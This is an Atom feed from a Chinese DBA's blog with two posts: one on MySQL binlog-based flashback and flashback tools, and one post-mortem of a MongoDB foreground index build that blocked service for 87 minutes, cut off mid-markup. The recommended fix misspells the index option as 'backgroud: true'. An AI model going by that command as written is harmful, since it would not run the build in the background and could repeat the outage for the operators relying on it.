<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jamin Blog</title>
  <icon>https://www.gravatar.com/avatar/fca0f49342f608d216999d4b41d5ba65</icon>
  <subtitle>一个不聊技术的 DBA 不是一个好厨子...</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://jiemin.wang/"/>
  <updated>2019-04-19T03:48:37.921Z</updated>
  <id>https://jiemin.wang/</id>
  
  <author>
    <name>Wang Jiemin</name>
    <email>278667010@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MySQL闪回原理与实战</title>
    <link href="https://jiemin.wang/2019/04/19/mysql-flashback-priciple-and-practice/"/>
    <id>https://jiemin.wang/2019/04/19/mysql-flashback-priciple-and-practice/</id>
    <published>2019-04-19T03:33:54.000Z</published>
    <updated>2019-04-19T03:48:37.921Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>能用钱解决的问题都不是问题，可问题是我是穷人。</strong></p></blockquote><p>DBA或开发人员，有时会误删或者误更新数据，如果是线上环境并且影响较大，就需要能快速回滚。传统恢复方法是利用备份重搭实例，再应用去除错误sql后的binlog来恢复数据。此法费时费力，甚至需要停机维护，并不适合快速回滚。也有团队利用LVM快照来缩短恢复时间，但快照的缺点是会影响mysql的性能。</p><p>MySQL闪回(flashback)利用binlog直接进行回滚，能快速恢复且不用停机。本文将介绍闪回原理，给出笔者的实战经验，并对现存的闪回工具作比较。</p><h1 id="开胃菜"><a href="#开胃菜" class="headerlink" title="开胃菜"></a>开胃菜</h1><p>某天，小明因种种原因，误删了大批线上用户表的数据。他急忙找到公司DBA请求帮助，“客服电话已被打爆，大量用户投诉无法登陆，领导非常恼火。请问多久能恢复数据？”DBA一脸懵逼，沉默十秒后，伸出一根手指。“你的意思是一分钟就能恢复？太好了。”小明终于有些放松，露出了一丝笑容。“不，我们中有个人将会离开公司。”DBA沉痛的说道。</p><p>勿让悲剧发生，尽早将此文转给公司DBA。</p><h1 id="闪回原理"><a href="#闪回原理" class="headerlink" title="闪回原理"></a>闪回原理</h1><p><strong>binlog概述</strong></p><p>MySQL binlog以event的形式，记录了MySQL server从启用binlog以来所有的变更信息，能够帮助重现这之间的所有变化。MySQL引入binlog主要有两个目的：一是为了主从复制；二是某些备份还原操作后需要重新应用binlog。</p><p>有三种可选的binlog格式，各有优缺点：</p><ul><li>statement：基于SQL语句的模式，binlog数据量小，但是某些语句和函数在复制过程可能导致数据不一致甚至出错；</li><li>row：基于行的模式，记录的是行的完整变化。很安全，但是binlog会比其他两种模式大很多；</li><li>mixed：混合模式，根据语句来选用是statement还是row模式；</li></ul><p>利用binlog闪回，<strong>需要将binlog格式设置为row</strong>。row模式下，一条使用innodb的insert会产生如下格式的binlog：</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># at 1129</span><br><span class="line">#161225 23:15:38 server id 3773306082  end_log_pos 1197         Query   thread_id=1903021       exec_time=0     error_code=0</span><br><span class="line">SET TIMESTAMP=1482678938/*!*/;</span><br><span class="line">BEGIN</span><br><span class="line">/*!*/;</span><br><span class="line"># at 1197</span><br><span class="line">#161225 23:15:38 server id 3773306082  end_log_pos 1245         Table_map: `test`.`user` mapped to number 290</span><br><span class="line"># at 1245</span><br><span class="line">#161225 23:15:38 server id 3773306082  end_log_pos 1352         Write_rows: table id 290 flags: STMT_END_F</span><br><span class="line"></span><br><span class="line">BINLOG '</span><br><span class="line">muJfWBPiFOjgMAAAAN0EAAAAACIBAAAAAAEABHRlc3QABHVzZXIAAwMPEQMeAAAC</span><br><span class="line">muJfWB7iFOjgawAAAEgFAAAAACIBAAAAAAEAAgAD//gBAAAABuWwj+i1tVhK1hH4AgAAAAblsI/p</span><br><span class="line">krFYStYg+AMAAAAG5bCP5a2ZWE/onPgEAAAABuWwj+adjlhNeAD4BQAAAAJ0dFhRYJM=</span><br><span class="line">'/*!*/;</span><br><span class="line"># at 1352</span><br><span class="line">#161225 23:15:38 server id 3773306082  end_log_pos 1379         Xid = 5327954</span><br><span class="line">COMMIT/*!*/;</span><br></pre></td></tr></tbody></table></figure><p><strong>闪回原理</strong></p><blockquote><p>既然binlog以event形式记录了所有的变更信息，那么我们把需要回滚的event，从后往前回滚回去即可。</p></blockquote><p>对于单个event的回滚，我们以表test.user来演示原理</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql> show create table test.user\G</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">       Table: user</span><br><span class="line">Create Table: CREATE TABLE `user` (</span><br><span class="line">  `id` int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  `name` varchar(10) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (`id`)</span><br><span class="line">) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8</span><br></pre></td></tr></tbody></table></figure><ul><li><p>对于delete操作，我们从binlog提取出delete信息，生成的回滚语句是insert。(注：为了方便解释，我们用binlog2sql将原始binlog转化成了可读SQL)</p>  <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始：DELETE FROM `test`.`user` WHERE `id`=1 AND `name`='小赵';</span><br><span class="line">回滚：INSERT INTO `test`.`user`(`id`, `name`) VALUES (1, '小赵');</span><br></pre></td></tr></tbody></table></figure></li><li><p>对于insert操作，回滚SQL是delete。</p>  <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始：INSERT INTO `test`.`user`(`id`, `name`) VALUES (2, '小钱');</span><br><span class="line">回滚：DELETE FROM `test`.`user` WHERE `id`=2 AND `name`='小钱';</span><br></pre></td></tr></tbody></table></figure></li><li><p>对于update操作，回滚sql应该交换SET和WHERE的值。</p>  <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始：UPDATE `test`.`user` SET `id`=3, `name`='小李' WHERE `id`=3 AND `name`='小孙';</span><br><span class="line">回滚：UPDATE `test`.`user` SET `id`=3, `name`='小孙' WHERE `id`=3 AND `name`='小李';</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h3><ul><li>闪回的目标：快速筛选出真正需要回滚的数据。</li><li>先根据库、表、时间做一次过滤，再根据位置做更准确的过滤。</li><li>由于数据一直在写入，要确保回滚sql中不包含其他数据。可根据是否是同一事务、误操作行数、字段值的特征等等来帮助判断。</li><li>执行回滚sql时如有报错，需要查实具体原因，一般是因为对应的数据已发生变化。由于是严格的行模式，只要有唯一键(包括主键)存在，就只会报某条数据不存在的错，不必担心会更新不该操作的数据。业务如果有特殊逻辑，数据回滚可能会带来影响。</li><li>如果只回滚某张表，并且该表有关联表，关联表并不会被回滚，需与业务方沟通清楚。</li></ul><h4 id="哪些数据需要回滚，让业务方来判断！"><a href="#哪些数据需要回滚，让业务方来判断！" class="headerlink" title="哪些数据需要回滚，让业务方来判断！"></a><strong>哪些数据需要回滚，让业务方来判断！</strong></h4><h1 id="闪回工具"><a href="#闪回工具" class="headerlink" title="闪回工具"></a>闪回工具</h1><p>MySQL闪回特性最早由阿里彭立勋开发，彭在2012年给官方提交了一个patch，并对<a href="http://www.penglixun.com/tech/database/mysql_flashback_feature.html" target="_blank" rel="noopener">闪回设计思路</a>做了说明(设计思路很有启发性，强烈推荐阅读)。但是因为种种原因，业内安装这个patch的团队至今还是少数，真正应用到线上的更是少之又少。彭之后，又有多位人员针对不同mysql版本不同语言开发了闪回工具，原理用的都是彭的思路。</p><p>我将这些闪回工具按实现方式分成了三类。</p><ul><li><p>第一类是以patch形式集成到官方工具mysqlbinlog中。以彭提交的patch为代表。</p><blockquote><p>优点</p><ul><li>上手成本低。mysqlbinlog原有的选项都能直接利用，只是多加了一个闪回选项。闪回特性未来有可能被官方收录。</li><li>支持离线解析。</li></ul><p>缺点</p><ul><li>兼容性差、项目活跃度不高。由于binlog格式的变动，如果闪回工具作者不及时对补丁升级，则闪回工具将无法使用。目前已有多位人员分别针对mysql5.5，5.6，5.7开发了patch，部分项目代码公开，但总体上活跃度都不高。</li><li>难以添加新功能，实战效果欠佳。在实战中，经常会遇到现有patch不满足需求的情况，比如要加个表过滤，很简单的一个需求，代码改动也不会大，但对大部分DBA来说，改mysql源码还是很困难的事。</li><li>安装稍显麻烦。需要对mysql源码打补丁再编译生成。</li></ul></blockquote><blockquote><p>这些缺点，可能都是闪回没有流行开来的原因。</p></blockquote></li><li><p>第二类是独立工具，通过伪装成slave拉取binlog来进行处理。以binlog2sql为代表。</p><blockquote><p>优点</p><ul><li>兼容性好。伪装成slave拉binlog这项技术在业界应用的非常广泛，多个开发语言都有这样的活跃项目，MySQL版本的兼容性由这些项目搞定，闪回工具的兼容问题不再突出。</li><li>添加新功能的难度小。更容易被改造成DBA自己喜欢的形式。更适合实战。</li><li>安装和使用简单。</li></ul><p>缺点</p><ul><li>必须开启MySQL server。</li></ul></blockquote></li><li><p>第三类是简单脚本。先用mysqlbinlog解析出文本格式的binlog，再根据回滚原理用正则进行匹配并替换。</p><blockquote><p>优点</p><ul><li>脚本写起来方便，往往能快速搞定某个特定问题。</li><li>安装和使用简单。</li><li>支持离线解析。</li></ul><p>缺点</p><ul><li>通用性不好。</li><li>可靠性不好。</li></ul></blockquote></li></ul><p>就目前的闪回工具而言，线上环境的闪回，笔者建议使用binlog2sql，离线解析使用mysqlbinlog。</p><h3 id="关于DDL的flashback"><a href="#关于DDL的flashback" class="headerlink" title="关于DDL的flashback"></a>关于DDL的flashback</h3><p>本文所述的flashback仅针对DML语句的快速回滚。但如果误操作是DDL的话，是无法利用binlog做快速回滚的，因为即使在row模式下，binlog对于DDL操作也不会记录每行数据的变化。要实现DDL快速回滚，必须修改MySQL源码，使得在执行DDL前先备份老数据。目前有多个mysql定制版本实现了DDL闪回特性，阿里林晓斌团队提交了patch给MySQL官方，MariaDB预计在不久后加入包含DDL的flashback特性。DDL闪回的副作用是会增加额外存储。考虑到其应用频次实在过低，本文不做详述，有兴趣的同学可以自己去了解，重要的几篇文章我在参考资料中做了引用。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] MySQL Internals Manual, <a href="http://dev.mysql.com/doc/internals/en/binary-log.html" target="_blank" rel="noopener">Chapter 20 The Binary Log</a></p><p>[2] 彭立勋，<a href="http://www.penglixun.com/tech/database/mysql_flashback_feature.html" target="_blank" rel="noopener">MySQL下实现闪回的设计思路</a></p><p>[3] Lixun Peng, <a href="https://bugs.mysql.com/bug.php?id=65178" target="_blank" rel="noopener">Provide the flashback feature by binlog</a></p><p>[4] 王广友，<a href="http://www.cnblogs.com/youge-OneSQL/p/5249736.html" target="_blank" rel="noopener">mysqlbinlog flashback 5.6完全使用手册与原理</a></p><p>[5] 姜承尧, <a href="http://mp.weixin.qq.com/s?__biz=MjM5MjIxNDA4NA==&mid=2649737874&idx=1&sn=a993322ae58db541c2cf4d9a1efa3063&chksm=beb2d7b989c55eafb7ddcadb28f45bb6018b3e9e65df20b30217fe8cb26d3d444d58076f2d76&mpshare=1&scene=1&srcid=1228ta3qs3QIN6FS4AUCuCKm#rd" target="_blank" rel="noopener">拿走不谢，Flashback for MySQL 5.7</a></p><p>[6] 林晓斌, <a href="http://dinglin.iteye.com/blog/1539167" target="_blank" rel="noopener">MySQL闪回方案讨论及实现</a></p><p>[7] xiaobin lin, <a href="https://bugs.mysql.com/bug.php?id=65861" target="_blank" rel="noopener">flashback from binlog for MySQL</a></p><p>[8] mariadb.com, <a href="https://mariadb.com/resources/blog/alisql-and-some-features-have-made-it-mariadb-server" target="_blank" rel="noopener">AliSQL and some features that have made it into MariaDB Server</a></p><p>[9] danfengcao, <a href="https://github.com/danfengcao/binlog2sql" target="_blank" rel="noopener">binlog2sql: Parse MySQL binlog to SQL you want</a></p><h1 id="文章来自"><a href="#文章来自" class="headerlink" title="文章来自"></a>文章来自</h1><p><a href="https://github.com/danfengcao/binlog2sql/blob/master/example/mysql-flashback-priciple-and-practice.md" target="_blank" rel="noopener">MySQL闪回原理与实战</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpg&quot; class=&quot;full-image&quot; alt=&quot;a
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB 添加索引引发的故障</title>
    <link href="https://jiemin.wang/2019/04/17/mongodb-creata-index/"/>
    <id>https://jiemin.wang/2019/04/17/mongodb-creata-index/</id>
    <published>2019-04-17T09:16:33.000Z</published>
    <updated>2019-04-17T09:38:07.216Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>咸鱼翻身，还是咸鱼。</strong></p></blockquote><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>线上MongoDB服务器资源报警，查看MongoDB log发现有大量的查询没有走索引。于是添加索引</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>具体的查询语句列子:<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">command</span> feeds.content_medium_hismatch <span class="built_in">command</span>: count { count: <span class="string">"content_medium_hismatch"</span>, query: { update_time: { <span class="variable">$gte</span>: 1384099200000, <span class="variable">$lt</span>: 1384185600000 }, content_type_id: <span class="string">"28"</span> } } planSummary: IXSCAN { content_type_id: 1 } keysExamined:191146 docsExamined:191146 fromMultiPlanner:1 replanned:1 numYields:10767 reslen:44 locks:{ Global: { acquireCount: { r: 21536 } }, Database: { acquireCount: { r: 10768 } }, Collection: { acquireCount: { r: 10768 } } } protocol:op_query 84011ms</span><br></pre></td></tr></tbody></table></figure><p></p><p>通过MongoDB explain()<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">repset:PRIMARY> db.content_medium_hismatch.find({ count: <span class="string">"content_medium_hismatch"</span>, query: { update_time: { <span class="variable">$gte</span>: 1384099200000, <span class="variable">$lt</span>: 1384185600000 }, content_type_id: <span class="string">"28"</span> }}).explain()</span><br><span class="line">{</span><br><span class="line">        <span class="string">"queryPlanner"</span> : {</span><br><span class="line">                <span class="string">"plannerVersion"</span> : 1,</span><br><span class="line">                <span class="string">"namespace"</span> : <span class="string">"feeds.content_medium_hismatch"</span>,</span><br><span class="line">                <span class="string">"indexFilterSet"</span> : <span class="literal">false</span>,</span><br><span class="line">                <span class="string">"parsedQuery"</span> : {</span><br><span class="line">                        <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"count"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"content_medium_hismatch"</span></span><br><span class="line">                                        }</span><br><span class="line">                                },</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"query"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000,</span><br><span class="line">                                                                <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                        },</span><br><span class="line">                                                        <span class="string">"content_type_id"</span> : <span class="string">"28"</span></span><br><span class="line">                                                }</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        ]</span><br><span class="line">                },</span><br><span class="line">                <span class="string">"winningPlan"</span> : {</span><br><span class="line">                        <span class="string">"stage"</span> : <span class="string">"COLLSCAN"</span>,</span><br><span class="line">                        <span class="string">"filter"</span> : {</span><br><span class="line">                                <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                        {</span><br><span class="line">                                                <span class="string">"count"</span> : {</span><br><span class="line">                                                        <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"content_medium_hismatch"</span></span><br><span class="line">                                                }</span><br><span class="line">                                        },</span><br><span class="line">                                        {</span><br><span class="line">                                                <span class="string">"query"</span> : {</span><br><span class="line">                                                        <span class="string">"<span class="variable">$eq</span>"</span> : {</span><br><span class="line">                                                                <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                        <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000,</span><br><span class="line">                                                                        <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                                },</span><br><span class="line">                                                                <span class="string">"content_type_id"</span> : <span class="string">"28"</span></span><br><span class="line">                                                        }</span><br><span class="line">                                                }</span><br><span class="line">                                        }</span><br><span class="line">                                ]</span><br><span class="line">                        },</span><br><span class="line">                        <span class="string">"direction"</span> : <span class="string">"forward"</span></span><br><span class="line">                },</span><br><span class="line">                <span class="string">"rejectedPlans"</span> : [ ]</span><br><span class="line">        },</span><br><span class="line">        <span class="string">"serverInfo"</span> : {</span><br><span class="line">                <span class="string">"host"</span> : <span class="string">"public-ops-mongodb2.wj.babytree-ops.org"</span>,</span><br><span class="line">                <span class="string">"port"</span> : 29001,</span><br><span class="line">                <span class="string">"version"</span> : <span class="string">"3.4.2"</span>,</span><br><span class="line">                <span class="string">"gitVersion"</span> : <span class="string">"3f76e40c105fc223b3e5aac3e20dcd026b83b38b"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"ok"</span> : 1</span><br><span class="line">}</span><br><span class="line">repset:PRIMARY> </span><br><span class="line"></span><br><span class="line">repset:PRIMARY> db.content_medium_hismatch.find({ count: <span class="string">"content_medium_hismatch"</span>, query: { update_time: { <span class="variable">$gte</span>: 1384099200000, <span class="variable">$lt</span>: 1384185600000 }, content_type_id: <span class="string">"28"</span> }}).explain()</span><br><span class="line">{</span><br><span class="line">        <span class="string">"queryPlanner"</span> : {</span><br><span class="line">                <span class="string">"plannerVersion"</span> : 1,</span><br><span class="line">                <span class="string">"namespace"</span> : <span class="string">"feeds.content_medium_hismatch"</span>,</span><br><span class="line">                <span class="string">"indexFilterSet"</span> : <span class="literal">false</span>,</span><br><span class="line">                <span class="string">"parsedQuery"</span> : {</span><br><span class="line">                        <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"count"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"content_medium_hismatch"</span></span><br><span class="line">                                        }</span><br><span class="line">                                },</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"query"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000,</span><br><span class="line">                                                                <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                        },</span><br><span class="line">                                                        <span class="string">"content_type_id"</span> : <span class="string">"28"</span></span><br><span class="line">                                                }</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        ]</span><br><span class="line">                },</span><br><span class="line">                <span class="string">"winningPlan"</span> : {</span><br><span class="line">                        <span class="string">"stage"</span> : <span class="string">"COLLSCAN"</span>,</span><br><span class="line">                        <span class="string">"filter"</span> : {</span><br><span class="line">                                <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                        {</span><br><span class="line">                                                <span class="string">"count"</span> : {</span><br><span class="line">                                                        <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"content_medium_hismatch"</span></span><br><span class="line">                                                }</span><br><span class="line">                                        },</span><br><span class="line">                                        {</span><br><span class="line">                                                <span class="string">"query"</span> : {</span><br><span class="line">                                                        <span class="string">"<span class="variable">$eq</span>"</span> : {</span><br><span class="line">                                                                <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                        <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000,</span><br><span class="line">                                                                        <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                                },</span><br><span class="line">                                                                <span class="string">"content_type_id"</span> : <span class="string">"28"</span></span><br><span class="line">                                                        }</span><br><span class="line">                                                }</span><br><span class="line">                                        }</span><br><span class="line">                                ]</span><br><span class="line">                        },</span><br><span class="line">                        <span class="string">"direction"</span> : <span class="string">"forward"</span></span><br><span class="line">                },</span><br><span class="line">                <span class="string">"rejectedPlans"</span> : [ ]</span><br><span class="line">        },</span><br><span class="line">        <span class="string">"serverInfo"</span> : {</span><br><span class="line">                <span class="string">"host"</span> : <span class="string">"public-ops-mongodb2.wj.babytree-ops.org"</span>,</span><br><span class="line">                <span class="string">"port"</span> : 29001,</span><br><span class="line">                <span class="string">"version"</span> : <span class="string">"3.4.2"</span>,</span><br><span class="line">                <span class="string">"gitVersion"</span> : <span class="string">"3f76e40c105fc223b3e5aac3e20dcd026b83b38b"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"ok"</span> : 1</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>于是很鲁莽的添加了索引操作<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.content_medium_hismatch.ensureIndex({update_time: 1, content_type_id: 1})</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现时间很长，于是就crtl+c中断操作，在执行登录MongoDB shell 发现操作都堵塞。执行<code>tail -f /data/repset/log/mongod.log</code>发现<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2019-04-04T16:54:54.984+0800 I INDEX [conn2744778] build index on: feeds.content_medium_hismatch properties: { v: 2, key: { update_time: 1.0, content_type_id: 1.0 }, name: <span class="string">"update_time_1_content_type_id_1"</span>, ns: <span class="string">"feeds.content_medium_hismatch"</span> }</span><br><span class="line"></span><br><span class="line">Index Build: 33461300/138238312 0%</span><br><span class="line">……</span><br><span class="line">Index Build: 33461300/138238312 99%</span><br><span class="line"></span><br><span class="line">Index: (2/3) BTree Bottom Up Progress: 99135500/138238312 1%</span><br><span class="line">……</span><br><span class="line">Index: (2/3) BTree Bottom Up Progress: 99135500/138238312 71%</span><br><span class="line"></span><br><span class="line">2019-04-04T18:22:05.817+0800 I INDEX [conn2744778] build index <span class="keyword">done</span>. scanned 138238312 total records. 5230 secs</span><br></pre></td></tr></tbody></table></figure><p></p><p>还在执行创建索引操作。经过排查发现。MongoDB 不是和MySQL一样。中断了就不执行了。而且MongoDB 在前台创建索引操作。会把整个服务阻塞。直到索引创建成功，才会放开阻塞。这样操作直接造成了业务不可用状态，时间整整87分钟。鲁莽惹的祸。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当系统已有大量数据时，创建索引就是个非常耗时的活，我们可以在后台执行，只需指定”backgroud: true”即可。<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.content_medium_hismatch.ensureIndex({update_time: 1, content_type_id: 1}, {backgroud: <span class="literal">true</span>})</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>最后在看一下如此之大的代价创建的索引之后使用的情况<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 